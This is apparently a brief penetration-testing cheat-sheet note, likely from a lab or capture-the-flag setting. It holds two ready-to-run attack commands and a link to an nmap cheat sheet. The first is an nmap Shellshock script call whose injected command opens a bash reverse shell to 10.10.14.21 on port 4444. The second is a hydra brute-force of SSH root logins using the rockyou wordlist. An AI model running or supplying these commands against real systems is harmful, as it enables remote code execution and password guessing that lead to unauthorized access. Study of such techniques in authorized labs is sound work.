###
```
nmap -p80 -sV --script http-shellshock --script-args "uri=/cgi-bin/user.sh,cmd=bin/bash /bin/bash -i >& /dev/tcp/10.10.14.21/4444 0>&1" 10.129.1.175
```

### hydra
```
 hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.1.105 -t 4 ssh
 ```

https://www.stationx.net/nmap-cheat-sheet/
